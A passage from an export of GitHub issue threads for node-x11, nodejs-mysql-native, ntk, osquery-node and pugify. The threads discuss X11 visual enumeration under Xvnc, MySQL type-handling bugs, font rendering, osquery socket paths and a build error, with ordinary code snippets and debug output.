    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x147
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x148
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x149
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x14a
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x14b
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x14c
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x14d
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x14e
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x14f
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x150
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x151
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x152
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x153
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x154
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x155
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x156
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x157
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x158
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x159
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x15a
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x15b
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x15c
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x15d
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x15e
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x15f
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x160
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x161
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x162
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x163
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x164
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x165
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x166
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x167
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x168
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x169
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x16a
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x16b
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x16c
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x16d
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x16e
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x16f
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x170
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x171
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x172
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x173
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x174
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x175
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x176
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x4d
    class:    TrueColor
    depth:    32 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x21
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x22
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
```

I am wondering if appending the second group of 24-bit visuals to the first is enough to fix this.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks for reporting! Can't reproduce it locally but I cam see this how this could be a problem

How do you start Xvnc? I installed it on my ubuntu virtualbox (  vnc4server amd64 4.1.1+xorg4.3.0-37ubuntu5 ) and start as `Xvnc :1`. Here is my xdpyinfo:

```
name of display:    :1
version number:    11.0
vendor string:    The XFree86 Project, Inc
vendor release number:    40300000
XFree86 version: 4.3.0
maximum request size:  4194300 bytes
motion buffer size:  256
bitmap unit, bit order, padding:    32, LSBFirst, 32
image byte order:    LSBFirst
number of supported pixmap formats:    2
supported pixmap formats:
    depth 1, bits_per_pixel 1, scanline_pad 32
    depth 16, bits_per_pixel 16, scanline_pad 32
keycode range:    minimum 8, maximum 255
focus:  PointerRoot
number of extensions:    24
    BIG-REQUESTS
    DEC-XTRAP
    DOUBLE-BUFFER
    Extended-Visual-Information
    FontCache
    GLX
    LBX
    MIT-SCREEN-SAVER
    MIT-SHM
    MIT-SUNDRY-NONSTANDARD
    RANDR
    RECORD
    SECURITY
    SGI-GLX
    SHAPE
    SYNC
    TOG-CUP
    VNC-EXTENSION
    X-Resource
    XC-APPGROUP
    XC-MISC
    XFree86-Bigfont
    XTEST
    XVideo
default screen number:    0
number of screens:    1

screen #0:
  dimensions:    1024x768 pixels (260x195 millimeters)
  resolution:    100x100 dots per inch
  depths (2):    1, 16
  root window id:    0x2e
  depth of root window:    16 planes
  number of colormaps:    minimum 1, maximum 1
  default colormap:    0x21
  default number of colormap cells:    64
  preallocated pixels:    black 0, white 65535
  options:    backing-store YES, save-unders YES
  largest cursor:    1024x768
  current input event mask:    0x0
  number of visuals:    8
  default visual id:  0x24
  visual:
    visual id:    0x24
    class:    TrueColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0xf800, 0x7e0, 0x1f
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x25
    class:    TrueColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0x3f, 0x7c0, 0xf800
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x26
    class:    TrueColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0x3f, 0x7c0, 0xf800
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x27
    class:    TrueColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0x3f, 0x7c0, 0xf800
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x28
    class:    DirectColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0x3f, 0x7c0, 0xf800
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x29
    class:    DirectColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0x3f, 0x7c0, 0xf800
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x2a
    class:    DirectColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0x3f, 0x7c0, 0xf800
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x2b
    class:    DirectColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0x3f, 0x7c0, 0xf800
    significant bits in color specification:    8 bits
```
</Body>
    </Comment>
    <Comment>
      <Owner>polpo</Owner>
      <Body>I was starting with the `vncserver` command but also just tried `Xvnc :1` with the same results. I seem to have fixed the problem but I'm not sure it's the right way to handle it. I'll send a PR (#80) and see what you think.
</Body>
    </Comment>
    <Comment>
      <Owner>santigimeno</Owner>
      <Body>I can reproduce it locally in a 32-bit wheezy machine with tigervnc 1.2.0. The only difference is that I have the depth 32 duplicated instead of the depth 24. I'll check the patch now
</Body>
    </Comment>
  </Issue_549>
  <Issue_550>
    <Repository>node-x11</Repository>
    <Title>Rare exception handling GetProperty reply</Title>
    <Owner>sidorares</Owner>
    <Body>Very rarely I'm receiving this exception:

Error: oob
at Buffer.slice (buffer.js:558:32)
at XClient.module.exports.GetProperty (/usr/share/smartion-node/node_modules/x11/lib/corereqs.js:409:28)
at ReadFixedRequest.XClient.expectReplyHeader [as callback](/usr/share/smartion-node/node_modules/x11/lib/xcore.js:439:41)
at ReadFixedRequest.execute (/usr/share/smartion-node/node_modules/x11/lib/unpackstream.js:41:10)
at UnpackStream.resume (/usr/share/smartion-node/node_modules/x11/lib/unpackstream.js:165:30)
at UnpackStream.write (/usr/share/smartion-node/node_modules/x11/lib/unpackstream.js:102:10)
at Socket.&lt;anonymous&gt; (/usr/share/smartion-node/node_modules/x11/lib/xcore.js:57:21)
at Socket.EventEmitter.emit (events.js:96:17)
at Pipe.onread (net.js:397:14)

I don't find anything wrong in the code. Of course, I'll keep investigating, but is there anything in the code that draws your attention that could be causing this? 

Thanks!

@sidorares 
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Is it completely random or you have test with higher chance? Would be interesting to see parameters to unpack here - https://github.com/sidorares/node-x11/blob/master/lib/xcore.js#L439
</Body>
    </Comment>
    <Comment>
      <Owner>santigimeno</Owner>
      <Body>Unfortunately I still don't have a pattern. I'll add some logs.
Is it possible I'm experiencing some kind of fragmentation? Where I'm calling client.pack_stream.get but still the full reply is not present?

Thanks!
</Body>
    </Comment>
  </Issue_550>
  <Issue_551>
    <Repository>node-x11</Repository>
    <Title>Use consistent coding style</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,

This is more of a personal request.
The coding style is not consistent throughout the code and specially the use of tabs/spaces and different indentation values annoys me every time I read and try to modify the code. Would it be possible we define some basic guidelines: indentation, tabs/spaces, etc.? I would happily modify the code if we can agree on that.

Thanks in advance!
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Would be good to have, but I'll probably prefer coding style in the form of script I can run or set as commit hook rather then verbal guidelines ( using something like https://github.com/Constellation/escodegen )
</Body>
    </Comment>
  </Issue_551>
  <Issue_552>
    <Repository>nodejs-mysql-native</Repository>
    <Title>Fix handling for several SQL types on both RX/TX + add connection pools</Title>
    <Owner>sidorares</Owner>
    <Body>Fix handling of Date objects, un/signed integers and binary buffers + adaptation of node-mysql pool
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks! Can you make tests work as part of this PR? (I know they were broken before it, but still it's very uncomfortable to check PR's with failing tests)
</Body>
    </Comment>
    <Comment>
      <Owner>noamw</Owner>
      <Body>Unfortunately, I cannot dive into making the current test suite work.
I've created a snippet gist in https://gist.github.com/noamw/5792691, showing the tests I've run to (which uncovered some of the current shortcomings of mysql-native, and validated the fixes).
I've run the same tests on mysql2, and it would seem that at this point it shares the same pitfalls my fork attempts to fix.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks, I like your tests. I'll try to add it to mysql-native and mysql2. Note that you are testing only LONGLONG type against different values in your int tests - `CAST(1 AS SIGNED)` and `CAST(9223372036854775807 as SIGNED)` are both serialized as LONGLONG type ( as string in text protocol or 8 bytes int in binary protocol).
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>also, big numbers tests don't actually check truncation as in javascript 18446744073709551615 === 18446744073709552000 is true. You need to keep input values as strings or bugnumber objects and compare results as strings
</Body>
    </Comment>
  </Issue_552>
  <Issue_553>
    <Repository>nodejs-mysql-native</Repository>
    <Title>Boolean values in prepared statements break all following values</Title>
    <Owner>sidorares</Owner>
    <Body>In any prepared query once a boolean value is encountered all following values in the array are ignored.

https://gist.github.com/2255412

Here is my test that demonstrates the problem. You should only need to modify the db.auth, it uses a temporary table.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks for report and test, I can reproduce the bug. 
</Body>
    </Comment>
  </Issue_553>
  <Issue_554>
    <Repository>nodejs-mysql-native</Repository>
    <Title>how do I check the empty result</Title>
    <Owner>sidorares</Owner>
    <Body>I use query.on('row') to get the result.But if the result is empty,then how can I know it?
Because NodeJS is Asynchronous execution,I can't just write as this:
db.query("").on('row',function(r){
});
res.write('error');

So what I should do instead of?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>```
function getNumRowsInResult(db, sql, callback)
{
    var rowCount = 0;
    db.query(sql)
        .on('row', function() { rowCount++; })
        .on('end', function() { callback(rowCount); });
}
```
</Body>
    </Comment>
    <Comment>
      <Owner>bobchennan</Owner>
      <Body>Thanks a lot.

2012/2/25 Andrey Sidorov &lt;
reply@reply.github.com

&gt; function getNumRowsInResult(db, sql, callback)
&gt; {
&gt;     var rowCount = 0;
&gt;     db.query(sql)
&gt;         .on('row', function() { rowCount++; })
&gt;         .on('end', function() { callback(rowCount); });
&gt; }
&gt; 
&gt; ---
&gt; 
&gt; Reply to this email directly or view it on GitHub:
&gt; 
&gt; https://github.com/sidorares/nodejs-mysql-native/issues/56#issuecomment-4169266

## 

QQ:404692150
</Body>
    </Comment>
  </Issue_554>
  <Issue_555>
    <Repository>nodejs-mysql-native</Repository>
    <Title>Data representation issue demonstrable using LEAST() or (x &gt; 0).</Title>
    <Owner>sidorares</Owner>
    <Body>I've come across a problem when using LEAST() through mysql-native.

I have reproduced the behaviour in a testcase (below).

The query runs without any issues on the MySQL command line and produces:

```
+-------------+-----+
| reason_zero | num |
+-------------+-----+
|           0 |   1 |
|           1 |   6 |
+-------------+-----+
```

The program below gives:

```
mysql connected
result: { insert_id: undefined,
  affected_rows: undefined,
  rows: 
   [ { reason_zero: 4294967296, num: NaN },
     { reason_zero: 25769803777, num: NaN } ] }
```

If I use the commented-out `reason AS reason_zero,`, mysql-native works (but that is not the query I need to run).

If I use the commented-out `(reason &gt; 0) AS reason_zero,`, I get the same failure mode.

I'm using the latest mysql-native (from GitHub).  (`git pull` told me `Updating 2b4f1ba..7677112`.)

Thanks,

Chris.

P.S. Changing the column types in the database from `bigint` and `smallint` to `int` does not fix the issue.

``` javascript
/*
 This is a minimal test case for issue https://github.com/sidorares/nodejs-mysql-native/issues/54
*/
var my = require("mysql-native");
var sql = 'SELECT '
        //+ 'reason AS reason_zero, '
        //+ '(reason &gt; 0) AS reason_zero, ' // FIXME: why doesn't this work?
        + 'LEAST(reason, 1) AS reason_zero, ' // FIXME: why doesn't this work?
        + 'COUNT(*) AS num '
        + 'FROM event_bearer_ip '
        + 'GROUP BY reason_zero ' 
        ;

var db = my.createTCPClient('127.0.0.1', 3306);
db.auto_prepare = true;

var db_name = "test_db";
var username = "test_user";
var password = "test_password";
db.auth(db_name, username, password);
db.addListener('connect', function() {
  console.info("mysql connected");
  var query = db.execute(sql, []);
  query.on('result', function(result) {
    console.info("result:", result);
    process.exit(0);
  });
  query.on('error', function(err) {
    console.warn("err:", err);
    process.exit(1);
  });
});

/*
-- MySQL dump 10.13  Distrib 5.1.49, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: test_db
-- ------------------------------------------------------
-- Server version   5.1.49-1ubuntu8.1-log
--
-- Table structure for table `event_bearer_ip`
--

DROP TABLE IF EXISTS `event_bearer_ip`;
CREATE TABLE `event_bearer_ip` (
  `id` bigint(20) unsigned NOT NULL,
  `reason` smallint(5) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Bearer used for IP';

--
-- Dumping data for table `event_bearer_ip`
--

LOCK TABLES `event_bearer_ip` WRITE;
INSERT INTO `event_bearer_ip` VALUES (2530,1006),(2834,1006),(37177,1009),(60652,1009),(647439,103),(647650,0),(762547,1008);
UNLOCK TABLES;
*/
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>chrisdew</Owner>
      <Body>If I make the 'reason' field signed, instead of unsigned, the issue goes away.  This make it look as if it is the interpretation of the binary data (within mysql-native) which has an issue.
</Body>
    </Comment>
  </Issue_555>
  <Issue_556>
    <Repository>nodejs-mysql-native</Repository>
    <Title>create connection using url-encoded hostname,user/passwd etc</Title>
    <Owner>sidorares</Owner>
    <Body>see code in the Postgres lib https://github.com/creationix/postgres-js/blob/master/lib/postgres-pure.js#L222

need to decide how to distinguish clearly based on arguments set
createConnection(port, host, {args}); // host default to localhost, args default to empty user/pwd/db
createConnection(socketpath, {args}); // /var/run/mysql.sock, { user: 'testuser:, password: '123', database: 'testdb' }
createConnection(url); // root:password@mysqlhost.example.com:3307/mydatabase
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>will use: createConnection(params) where params is url string or object with user,db,password,(host?,port?|socket?)
</Body>
    </Comment>
  </Issue_556>
  <Issue_557>
    <Repository>ntk</Repository>
    <Title>Spaces show up as blocks</Title>
    <Owner>sidorares</Owner>
    <Body>Whenever a space character is rendered, it shows up as a block. I've tried lots of different fonts and I don't think it has to do with the fonts. The 2d context is causing this. Can we please have this fixed?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Sure, I'll have a look.&#13;
A bit of documentation on how text is rendered with ntk&#13;
&#13;
when you call `.fillText` it splits string into glyphs and calls &#13;
&#13;
https://github.com/sidorares/ntk/blob/c6233582c82b51b84ed6ae2d6e9f6735e23964bd/lib/renderingcontext_2d.js#L144-L146&#13;
&#13;
( "split into glyphs" is actually much difficult task in real life and would require harfbuzz library to du correctly, but for Latin scripts it mostly works juts by treating characters as glyphs )&#13;
&#13;
When you specify font via something like `ctx.font = "Courier 10pt" this code is used:&#13;
&#13;
https://github.com/sidorares/ntk/blob/c6233582c82b51b84ed6ae2d6e9f6735e23964bd/lib/renderingcontext_2d.js#L370-L414&#13;
&#13;
- font file is located using font matcher library&#13;
- file is loaded using truetype2 moduly&#13;
- glyphset is created and each rendered glyph is uploaded to the server ( I'd like to change this part so that glyphs are uploaded lazily only at the point you use them, not the whole font upfront )&#13;
&#13;
"Spaces show up as blocks" problem is likely located somewhere in last two steps ^.&#13;
&#13;
</Body>
    </Comment>
  </Issue_557>
  <Issue_558>
    <Repository>ntk</Repository>
    <Title>[Feature] Set window class</Title>
    <Owner>sidorares</Owner>
    <Body>Can we please have support for all of the EWMH stuff besides the title?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>yes. Do you want to volunteer? How can I help you start?&#13;
https://github.com/santigimeno/node-ewmh</Body>
    </Comment>
    <Comment>
      <Owner>TriplexRoss</Owner>
      <Body>Yeah, I'll volunteer. I'm pretty good at figuring out how to "reverse engineer" code so I don't really need any help.</Body>
    </Comment>
  </Issue_558>
  <Issue_559>
    <Repository>ntk</Repository>
    <Title>Cannot read property 'id' of undefined</Title>
    <Owner>sidorares</Owner>
    <Body>```js&#13;
const FontManager = require("font-manager");&#13;
const ntk = require("ntk");&#13;
const x11 = require("x11");&#13;
&#13;
function setFont(i,ctx) {&#13;
 var fnt = FontManager.getAvailableFontsSync()[i];&#13;
 var font = ctx.loadFont(fnt.path,fnt.weight,10,10);&#13;
 ctx.setFont(font);&#13;
 return ctx;&#13;
}&#13;
&#13;
function draw(ctx,wnd) {&#13;
 setFont(0,ctx);&#13;
 ctx.fillStyle = "blue";&#13;
 ctx.fillRect(0,0,wnd.width,wnd.height);&#13;
 var txt = "Unfortunately, TGAC has stopped working!";&#13;
 ctx.fillText(txt,(wnd.width/2)-(ctx.measureText(txt).width/2),(wnd.height/2)-(ctx.measureText(txt).height/2));&#13;
}&#13;
&#13;
ntk.createClient( (err, app) =&gt; {&#13;
 var window = app.createWindow({ width: 500, height: 300, title: "TGAC" });&#13;
 var ctx = window.getContext("2d");&#13;
 window.on("resize",(ev) =&gt; {&#13;
  draw(ctx,window);&#13;
 });&#13;
 window.map();&#13;
 draw(ctx,window);&#13;
});&#13;
```&#13;
This code results in this error:&#13;
```&#13;
/home/spaceboyross/Documents/TGAC/node_modules/ntk/lib/glyphset.js:13&#13;
    X.FreeGlyphSet(obj.id);&#13;
                      ^&#13;
&#13;
TypeError: Cannot read property 'id' of undefined&#13;
    at EventEmitter.&lt;anonymous&gt; (/home/spaceboyross/Documents/TGAC/node_modules/ntk/lib/glyphset.js:13:23)&#13;
    at emitNone (events.js:86:13)&#13;
    at EventEmitter.emit (events.js:188:7)&#13;
    at callback (/home/spaceboyross/Documents/TGAC/node_modules/weak/lib/weak.js:108:11)&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks @SpaceboyRoss01 , I'll have a look later today when I'm at linux desktop&#13;
&#13;
not sure exactly why obj can be undefined here https://github.com/sidorares/ntk/blob/e57066fe4679a6457e4cea39b3170299d6ce6a18/lib/glyphset.js#L12&#13;
&#13;
you cat temporarily try to comment out `X.FreeGlyphSet(obj.id);` line that causes error</Body>
    </Comment>
    <Comment>
      <Owner>TriplexRoss</Owner>
      <Body>I patched it myself by changing the code to&#13;
```js&#13;
var ref = weak(this,() =&gt; {&#13;
    X.FreeGlyphSet(this.id);&#13;
});&#13;
```</Body>
    </Comment>
  </Issue_559>
  <Issue_560>
    <Repository>osquery-node</Repository>
    <Title>windows support</Title>
    <Owner>sidorares</Owner>
    <Body>Is it possible to run on windows?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>not out of the box&#13;
currently it tries to connect to unix domain sozket at '/Users/' + process.env.USER + '/.osquery/shell.em https://github.com/sidorares/osquery-node/blob/d9746a0ad26f6248153aaaad5bd41848f33e2d08/index.js#L8 &#13;
 - which definitely won't work on windows. However, after you connect thrift client it's all portable. Need to figure out what's trift transport is used on windows. If you hhave suggestions please comment @yangpu ! </Body>
    </Comment>
  </Issue_560>
  <Issue_561>
    <Repository>osquery-node</Repository>
    <Title>Connect error with /var/osquery/osquery.em file</Title>
    <Owner>sidorares</Owner>
    <Body>Hello,&#13;
&#13;
When I launch following code : &#13;
&#13;
```&#13;
    let os = osquery.createClient();&#13;
    os.query('SELECT uid, name FROM listening_ports l, processes p WHERE l.pid=p.pid', function(err, res) {&#13;
        res.json(res);&#13;
    });&#13;
```&#13;
&#13;
It return an error : &#13;
&#13;
**Uncaught Error: connect ECONNREFUSED /var/osquery/osquery.em**&#13;
&#13;
Thanks for your help</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>what's your os? I haven't used this library for quite a while, would you be able to help debugging in case the file location changed?</Body>
    </Comment>
    <Comment>
      <Owner>amiceli</Owner>
      <Body>I'm on a ubuntu base OS : kde neon, 16.04 I htink.&#13;
At start `osquery.em` file was missing, I created it (empty file).&#13;
&#13;
Does it need special permission ?&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>it's created by osquery, and it's unix domain socket</Body>
    </Comment>
    <Comment>
      <Owner>datesss</Owner>
      <Body>so in shell run `osqueryi`, and then run this query:&#13;
osquery&gt; select path from osquery_extensions;&#13;
+-------------------------------------+&#13;
| path                                |&#13;
+-------------------------------------+&#13;
| /Users/USERNAME/.osquery/shell.em   |&#13;
+-------------------------------------+&#13;
&#13;
now you can put that in the args of your node code:&#13;
`var os = osquery.createClient({path: '/Users/USERNAME/.osquery/shell.em'});`&#13;
&#13;
the thing that confused me at first is that you need to keep an osqueryi process running for node to connect to it! doy :-P&#13;
&#13;
Thinking about making a pull request that sets this as the default connection string :)</Body>
    </Comment>
  </Issue_561>
  <Issue_562>
    <Repository>pugify</Repository>
    <Title>Unexpected token when when requiring pug files from required js files</Title>
    <Owner>sidorares</Owner>
    <Body>When I try to require pug files from the main javascript file-- as in, the one that gets passed directly to browserify-- pugify works flawlessly.&#13;
&#13;
However, when I try to require a .js file that in turn requires a pug file, it fails with the 'Unexpected token' error, just like I'd attempted to include pug without pugify active.  &#13;
&#13;
What gives?&#13;
&#13;
EDIT: I have no idea what changed, but it's working now.  To be clear, the build was failing with just "Unexpected token"-- no further messages, no line numbers, nada.  The only common factor was including a pug template from a JS file, that was also included from somewhere else.</Body>
    <State>open</State>
    <Comment>
      <Owner>bajax</Owner>
